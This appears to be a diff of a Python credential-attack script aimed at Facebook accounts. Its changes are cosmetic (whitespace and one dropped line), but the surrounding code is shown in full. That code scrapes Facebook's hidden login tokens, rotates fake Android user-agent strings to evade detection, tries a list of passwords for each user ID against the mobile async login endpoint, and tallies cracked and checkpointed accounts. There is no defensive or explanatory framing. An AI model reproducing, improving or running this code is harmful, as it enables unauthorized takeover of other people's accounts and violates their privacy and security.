@@ -102,6 +102,7 @@ def random1():
             if MET in ['1']:
             	taybul.submit(lionking,uid,pwx)
     
+
 def uoa():
     ver=str(random.choice(range(77,500)))
     ver2=str(random.choice(range(57,77)))
@@ -129,19 +130,18 @@ def uoa():
     x=f"Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
     xx=f"Mozilla/5.0 (Linux; Android 4.2.2; M-MP8S2A3G Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Safari/537.36"
     return random.choice([a,b,c,d,e,g,h,j,k,l,q,w,r,t,y,u,i,o,p,z,x,xx])
+    
+    
 color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]
 def lionking(uid,pwx):
     global oks,loop,cps
     session=requests.Session()
     sys.stdout.write(f"\r {Z}[{H}{random.choice(color)}MR-LION{Z}]>{Z}[{H}{random.choice(color)}{loop}{Z}]>{Z}[{H}{random.choice(color)}OK:{len(oks)}{Z}>{K}{random.choice(color)}CP:{len(cps)}{Z}] \r"),
     sys.stdout.flush()
-    
     try:
         for ps in pwx:
-            
             free_fb = session.get(f'https://m.facebook.com').text
             datax={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
-            ua = random.choice(ugen)
             uax=uoa()
             hader={'Host': f'm.facebook.com', 'content-length': '1640', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"', 'sec-ch-ua-mobile': '?1', 'user-agent': uax, 'x-response-format': 'JSONStream', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-lsd': 'AVreZWR72Tc', 'viewport-width': '360', 'sec-ch-ua-platform-version': '""', 'x-requested-with': 'XMLHttpRequest', 'x-asbd-id': '129477', 'dpr': '2', 'sec-ch-ua-full-version-list': '', 'sec-ch-ua-model': '""', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua-platform': '"Android"', 'accept': '*/*', 'origin': f'https://m.facebook.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': f'https://m.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr', 'accept-encoding': 'gzip, deflate, br,', 'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
             url=f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
